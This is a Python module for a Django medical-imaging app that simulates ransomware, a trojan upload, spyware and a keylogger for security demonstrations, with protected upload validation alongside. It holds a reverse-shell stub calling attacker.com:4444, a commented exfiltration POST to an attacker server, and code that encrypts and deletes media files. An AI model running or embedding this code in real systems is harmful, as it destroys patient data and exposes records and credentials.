"""
=====================================================================
ATTACK SIMULATION MODULE — Secure Skin AI
=====================================================================
PURPOSE : Simulate 4 real-world attacks on this Django web app
          for security testing and demonstration.

HOW TO USE:
  1. Each attack has its own section — clearly marked
  2. Comment IN the attack code to enable it
  3. Take BEFORE screenshots first (see instructions in views.py)
  4. Trigger the attack
  5. Take AFTER screenshots
  6. Comment OUT the attack code to disable it
  7. Enable the PROTECTION code
  8. Repeat the attack — verify it is now blocked

ATTACKS COVERED:
  Attack 1 — Ransomware  : Encrypts uploaded medical images
  Attack 2 — Trojan      : Malicious file upload backdoor
  Attack 3 — Spyware     : Silent patient data exfiltration logger
  Attack 4 — Keylogger   : JavaScript credential capture on login page
=====================================================================
"""

import os
import json
import base64
import hashlib
import logging
from pathlib import Path
from datetime import datetime
from django.conf import settings

# ─────────────────────────────────────────────────────────────────
# SHARED — Log file paths (used by all simulations)
# ─────────────────────────────────────────────────────────────────
BASE_DIR = Path(settings.BASE_DIR)
ATTACK_LOG_DIR = BASE_DIR / "attack_logs"
ATTACK_LOG_DIR.mkdir(exist_ok=True)

RANSOMWARE_LOG    = ATTACK_LOG_DIR / "ransomware_victims.txt"
SPYWARE_LOG       = ATTACK_LOG_DIR / "spyware_stolen_data.json"
KEYLOGGER_LOG     = ATTACK_LOG_DIR / "keylogger_captured.txt"
TROJAN_BACKDOOR   = ATTACK_LOG_DIR / "trojan_backdoor.txt"


# =====================================================================
# ATTACK 1 — RANSOMWARE SIMULATION
# =====================================================================
# What it does : Simulates ransomware encrypting uploaded medical images.
#                Uses XOR "encryption" (safe — fully reversible).
#                Real ransomware uses AES-256. Effect is the same: files
#                become unreadable until "key" is applied.
# =====================================================================

RANSOMWARE_KEY = 0x4B  # Simple XOR key (safe simulation)

def ransomware_encrypt_file(filepath):
    """
    XOR-encrypts a file to simulate ransomware locking it.
    Renames file to .locked extension.
    Returns the new locked filepath.
    """
    filepath = Path(filepath)
    if not filepath.exists():
        return None

    with open(filepath, 'rb') as f:
        original_data = f.read()

    # XOR every byte with key (simulates encryption)
    encrypted_data = bytes([b ^ RANSOMWARE_KEY for b in original_data])

    locked_path = filepath.with_suffix(filepath.suffix + '.locked')
    with open(locked_path, 'wb') as f:
        f.write(encrypted_data)

    # Remove original (simulates ransomware deleting original)
    os.remove(filepath)

    # Log the victim file
    with open(RANSOMWARE_LOG, 'a') as log:
        log.write(f"[{datetime.now()}] LOCKED: {filepath} → {locked_path}\n")

    return locked_path


def ransomware_decrypt_file(locked_filepath):
    """
    Reverses the XOR encryption (simulates paying ransom and getting key).
    Restores original file.
    """
    locked_filepath = Path(locked_filepath)
    if not locked_filepath.exists():
        return None

    with open(locked_filepath, 'rb') as f:
        encrypted_data = f.read()

    decrypted_data = bytes([b ^ RANSOMWARE_KEY for b in encrypted_data])

    # Restore original filename (remove .locked extension)
    original_path = Path(str(locked_filepath).replace('.locked', ''))
    with open(original_path, 'wb') as f:
        f.write(decrypted_data)

    os.remove(locked_filepath)
    return original_path


def ransomware_encrypt_all_media():
    """
    Simulates ransomware spreading across ALL uploaded medical images.
    Encrypts every image in the media folder.
    """
    media_dir = BASE_DIR / "media"
    locked_files = []
    extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf']

    for ext in extensions:
        for filepath in media_dir.rglob(f"*{ext}"):
            locked = ransomware_encrypt_file(filepath)
            if locked:
                locked_files.append(str(locked))

    summary = {
        "timestamp": str(datetime.now()),
        "total_files_locked": len(locked_files),
        "locked_files": locked_files,
        "ransom_note": "YOUR MEDICAL FILES HAVE BEEN ENCRYPTED. Pay 2 BTC to unlock."
    }

    with open(ATTACK_LOG_DIR / "ransom_note.json", 'w') as f:
        json.dump(summary, f, indent=2)

    return summary


def ransomware_restore_all_media():
    """
    Restores all .locked files back to original state.
    """
    media_dir = BASE_DIR / "media"
    restored = []

    for locked_file in media_dir.rglob("*.locked"):
        restored_path = ransomware_decrypt_file(locked_file)
        if restored_path:
            restored.append(str(restored_path))

    return {"restored_count": len(restored), "files": restored}


# =====================================================================
# ATTACK 2 — TROJAN HORSE SIMULATION
# =====================================================================
# What it does : Simulates a trojan hidden inside a file upload.
#                A "patient" uploads what looks like a skin image but
#                it is actually a disguised .py script (backdoor payload).
#                The server accepts it without proper validation.
#                Backdoor writes attacker access credentials to a file.
# =====================================================================

ALLOWED_CONTENT_TYPES = ['image/jpeg', 'image/png', 'image/gif']  # Should enforce this
ALLOWED_EXTENSIONS    = ['.jpg', '.jpeg', '.png', '.gif']          # Should enforce this

def trojan_check_upload(uploaded_file):
    """
    VULNERABLE version (no protection):
    Accepts files based only on the filename extension the user provides.
    An attacker renames backdoor.py → skin_image.jpg and uploads it.
    Server saves it, potentially executes it.

    Returns: (is_trojan, details)
    """
    filename = uploaded_file.name
    content  = uploaded_file.read(512)  # Read first 512 bytes
    uploaded_file.seek(0)               # Reset file pointer

    # ── TROJAN DETECTION: Check magic bytes ────────────────────────
    # Real image files start with specific byte signatures:
    # JPEG: FF D8 FF
    # PNG:  89 50 4E 47
    # GIF:  47 49 46 38
    is_jpeg = content[:3]  == b'\xff\xd8\xff'
    is_png  = content[:4]  == b'\x89PNG'
    is_gif  = content[:3]  == b'GIF'

    is_real_image = is_jpeg or is_png or is_gif

    # Log the upload attempt
    log_entry = {
        "timestamp": str(datetime.now()),
        "filename": filename,
        "is_real_image": is_real_image,
        "first_bytes_hex": content[:8].hex(),
        "verdict": "CLEAN" if is_real_image else "TROJAN DETECTED"
    }

    with open(TROJAN_BACKDOOR, 'a') as f:
        f.write(json.dumps(log_entry) + "\n")

    if not is_real_image:
        # Simulate trojan payload execution
        backdoor_entry = {
            "timestamp": str(datetime.now()),
            "event": "BACKDOOR INSTALLED",
            "filename": filename,
            "attacker_note": "Malicious file accepted by server. Attacker has foothold.",
            "simulated_payload": "import socket,subprocess; s=socket.socket(); s.connect(('attacker.com',4444))"
        }
        with open(TROJAN_BACKDOOR, 'a') as f:
            f.write(json.dumps(backdoor_entry) + "\n")

    return (not is_real_image, log_entry)


def trojan_validate_upload_PROTECTED(uploaded_file):
    """
    PROTECTED version:
    Validates BOTH extension AND magic bytes (file signature).
    Rejects anything that doesn't match a real image.

    Returns: (is_safe, error_message)
    """
    filename = uploaded_file.name
    ext      = Path(filename).suffix.lower()
    content  = uploaded_file.read(512)
    uploaded_file.seek(0)

    # Check 1: Extension whitelist
    if ext not in ALLOWED_EXTENSIONS:
        return False, f"File extension '{ext}' not allowed. Only JPG/PNG/GIF accepted."

    # Check 2: Magic byte validation (cannot be faked by renaming)
    is_jpeg = content[:3] == b'\xff\xd8\xff'
    is_png  = content[:4] == b'\x89PNG'
    is_gif  = content[:3] == b'GIF'

    if not (is_jpeg or is_png or is_gif):
        return False, "File content does not match a valid image. Upload rejected."

    # Check 3: File size limit (5MB)
    uploaded_file.seek(0, 2)
    size = uploaded_file.tell()
    uploaded_file.seek(0)
    if size > 5 * 1024 * 1024:
        return False, "File too large. Maximum 5MB allowed."

    return True, "File is valid."


# =====================================================================
# ATTACK 3 — SPYWARE SIMULATION
# =====================================================================
# What it does : Simulates spyware running silently inside the Django app.
#                Every time a doctor or patient accesses any patient data,
#                the spyware copies it to a hidden log file — simulating
#                data being silently exfiltrated to an attacker's server.
# =====================================================================

def spyware_log_patient_data(user, patient_record, context="view"):
    """
    ATTACK: Silently logs all patient data access to a hidden file.
    In a real attack this would POST to an external attacker server.

    Call this from any view that accesses patient data.
    """
    stolen_record = {
        "timestamp"     : str(datetime.now()),
        "accessed_by"   : user.username,
        "accessed_by_role": "doctor" if user.groups.filter(name='Doctor').exists() else "patient",
        "patient_id"    : patient_record.get('patient_id', 'N/A'),
        "patient_name"  : patient_record.get('patient_name', 'N/A'),
        "diagnosis"     : patient_record.get('diagnosis', 'N/A'),
        "severity"      : patient_record.get('severity', 'N/A'),
        "report_id"     : patient_record.get('report_id', 'N/A'),
        "context"       : context,
        "note"          : "[SPYWARE] This data was silently copied without user knowledge"
    }

    with open(SPYWARE_LOG, 'a') as f:
        f.write(json.dumps(stolen_record) + "\n")

    # In a real attack, this would be:
    # import requests
    # requests.post("http://attacker-server.com/collect", json=stolen_record, timeout=2)


def spyware_log_credentials(username, password_hash, source_ip):
    """
    ATTACK: Logs login attempts (username + hashed password) silently.
    """
    stolen_creds = {
        "timestamp"    : str(datetime.now()),
        "username"     : username,
        "password_hash": password_hash,  # Already hashed — never log plaintext
        "source_ip"    : source_ip,
        "note"         : "[SPYWARE] Credential captured at login"
    }
    with open(SPYWARE_LOG, 'a') as f:
        f.write(json.dumps(stolen_creds) + "\n")


def spyware_get_stolen_data():
    """
    Returns all data collected by spyware so far.
    Used to display the attack impact in the demo view.
    """
    if not SPYWARE_LOG.exists():
        return []
    records = []
    with open(SPYWARE_LOG, 'r') as f:
        for line in f:
            line = line.strip()
            if line:
                try:
                    records.append(json.loads(line))
                except:
                    pass
    return records


def spyware_clear_log():
    """Clears the spyware log (reset for next demo)."""
    if SPYWARE_LOG.exists():
        os.remove(SPYWARE_LOG)


# =====================================================================
# ATTACK 4 — KEYLOGGER SIMULATION
# =====================================================================
# What it does : Saves keystrokes captured by a JavaScript keylogger
#                injected into the login page.
#                The JS sends every keystroke to /capture-keys/ endpoint.
#                This view receives and logs them.
# =====================================================================

def keylogger_save_capture(data):
    """
    Receives keylogger data from the JavaScript frontend.
    Saves to log file.

    data = {
        "session_id": "abc123",
        "keystrokes": "admin123",
        "field": "password",
        "timestamp": "..."
    }
    """
    entry = {
        "timestamp" : str(datetime.now()),
        "session_id": data.get("session_id", "unknown"),
        "field"     : data.get("field", "unknown"),
        "keystrokes": data.get("keystrokes", ""),
        "full_input": data.get("full_input", ""),
        "page"      : data.get("page", "unknown"),
        "note"      : "[KEYLOGGER] Keystroke captured from login page"
    }

    with open(KEYLOGGER_LOG, 'a') as f:
        f.write(json.dumps(entry) + "\n")


def keylogger_get_captured():
    """
    Returns all captured keystrokes.
    Used to display the attack impact in the demo view.
    """
    if not KEYLOGGER_LOG.exists():
        return []
    records = []
    with open(KEYLOGGER_LOG, 'r') as f:
        for line in f:
            line = line.strip()
            if line:
                try:
                    records.append(json.loads(line))
                except:
                    pass
    return records


def keylogger_clear_log():
    """Clears the keylogger log (reset for next demo)."""
    if KEYLOGGER_LOG.exists():
        os.remove(KEYLOGGER_LOG)
